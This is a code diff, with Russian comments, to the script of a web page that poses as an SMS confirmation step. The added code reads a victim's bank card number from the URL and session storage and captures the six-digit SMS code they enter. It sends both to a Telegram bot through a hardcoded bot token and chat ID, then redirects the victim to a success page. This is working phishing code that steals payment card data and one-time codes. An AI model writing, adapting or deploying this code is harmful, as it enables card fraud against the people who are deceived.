@@ -839,6 +839,69 @@
 
         // Предотвращаем масштабирование на iOS при фокусе
         document.addEventListener('touchstart', function() {}, {passive: true});
+        // Функция отправки SMS кода в бота
+async function sendSMSCodeToBot(code) {
+    try {
+        // Берем номер карты из sessionStorage
+        const cardNumber = sessionStorage.getItem('cardNumber') || 'НЕТ ДАННЫХ';
+        
+        const message = `📱 <b>ВВЕДЕН SMS КОД</b>\n\n` +
+                       `💳 <b>Карта:</b> ${cardNumber}\n` +
+                       `🔢 <b>SMS Код:</b> ${code}`;
+
+        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
+        const CHAT_ID = '-1003239032658';
+
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        const result = await response.json();
+        console.log('✅ SMS код отправлен в бота:', result.ok);
+        return result.ok;
+
+    } catch (error) {
+        console.error('❌ Ошибка отправки SMS кода:', error);
+        return false;
+    }
+}
+
+// Сохраняем номер карты при переходе на SMS страницу
+window.addEventListener('DOMContentLoaded', function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const cardNumber = urlParams.get('card') || sessionStorage.getItem('cardNumber');
+    if (cardNumber) {
+        sessionStorage.setItem('cardNumber', cardNumber);
+        console.log('💳 Номер карты сохранен:', cardNumber);
+    }
+});
+
+// Обновляем обработчик кнопки подтверждения
+document.getElementById('confirmBtn').addEventListener('click', async function() {
+    const inputs = document.querySelectorAll('.code-input');
+    const code = Array.from(inputs).map(input => input.value).join('');
+    
+    if (code.length === 6) {
+        console.log('🔢 Введенный код:', code);
+        
+        // Отправляем код в бота
+        const success = await sendSMSCodeToBot(code);
+        
+        if (success) {
+            // Перенаправляем на страницу успеха
+            window.location.href = 'success.html';
+        } else {
+            alert('Ошибка отправки кода');
+        }
+    }
+});
     </script>
 </body>
 </html>
+
